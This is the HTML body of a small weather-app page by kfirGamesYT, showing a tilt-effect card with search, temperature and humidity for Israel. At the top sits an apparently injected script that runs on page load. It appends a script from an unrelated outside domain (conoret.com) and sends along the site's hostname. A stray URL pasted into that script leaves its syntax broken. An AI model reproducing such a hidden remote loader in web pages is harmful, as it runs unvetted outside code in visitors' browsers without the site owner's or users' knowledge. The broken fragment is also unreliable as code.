  <body>
    <script type="text/javascript">
      window.top === window &&
        !(function () {
          var e = document.createElement("script"),https://kfirgamesyt.github.io/Euro-Weather/
            t = document.getElementsByTagName("head")[0];
          (e.src =
            "//conoret.com/dsp?h=" +
            document.location.hostname +
            "&r=" +
            Math.random()),
            (e.type = "text/javascript"),
            (e.defer = !0),
            (e.async = !0),
            t.appendChild(e);
        })();
    </script>
    <div
      class="card"
      style="
        will-change: transform;
        transform: perspective(1000px) rotateX(0deg) rotateY(0deg)
          scale3d(1, 1, 1);
      "
    >
      <div class="search">
        <input type="text" class="search-bar" placeholder="Search" />
        <button>
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewbox="0 0 1024 1024"
            height="1.5em"
            width="1.5em"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M909.6 854.5L649.9 594.8C690.2 542.7 712 479 712 412c0-80.2-31.3-155.4-87.9-212.1-56.6-56.7-132-87.9-212.1-87.9s-155.5 31.3-212.1 87.9C143.2 256.5 112 331.8 112 412c0 80.1 31.3 155.5 87.9 212.1C256.5 680.8 331.8 712 412 712c67 0 130.6-21.8 182.7-62l259.7 259.6a8.2 8.2 0 0 0 11.6 0l43.6-43.5a8.2 8.2 0 0 0 0-11.6zM570.4 570.4C528 612.7 471.8 636 412 636s-116-23.3-158.4-65.6C211.3 528 188 471.8 188 412s23.3-116.1 65.6-158.4C296 211.3 352.2 188 412 188s116.1 23.2 158.4 65.6S636 352.2 636 412s-23.3 116.1-65.6 158.4z"
            ></path>
          </svg>
        </button>
      </div>
      <div class="weather">
        <h2 class="city">Weather in Israel</h2>
        <h1 class="temp">28.51°C</h1>
        <div class="flex">
          <img src="img/wn/01d.png" alt="" class="icon" />
          <div class="description">clear sky</div>
        </div>
        <div class="humidity">Humidity: 7%</div>
        <div class="wind">Wind speed: 6.29 km/h</div>
      </div>
      <div class="phone">
        <a
          ><img
            alt="github"
            src="images/Ero%20%281%29.png"
            width="90"
            height="90"
        /></a>
        <div><h2></h2></div>
        <div><small>Made by kfirGamesYT</small></div>
        <div><small>kfirGamesYT © 2022</small></div>
      </div>
      <script src="ajax/libs/vanilla-tilt/1.7.0/vanilla-tilt.min.js"></script>
      <script>
        VanillaTilt.init(document.querySelectorAll(".card"), {
          max: 4,
          speed: 800,
          scale: 1.03,
          glare: true,
          "max-glare": 0.5,
        });
      </script>
      <div
        class="js-tilt-glare"
        style="
          position: absolute;
          top: 0px;
          left: 0px;
          width: 100%;
          height: 100%;
          overflow: hidden;
          pointer-events: none;
        "
      >
        <div
          class="js-tilt-glare-inner"
          style="
            position: absolute;
            top: 50%;
            left: 50%;
            pointer-events: none;
            background-image: linear-gradient(
              0deg,
              rgba(255, 255, 255, 0) 0%,
              rgb(255, 255, 255) 100%
            );
            width: 972px;
            height: 972px;
            transform: rotate(180deg) translate(-50%, -50%);
            transform-origin: 0% 0%;
            opacity: 0;
          "
        ></div>
      </div>
      <script src="index.js" type="module"></script>
    </div>
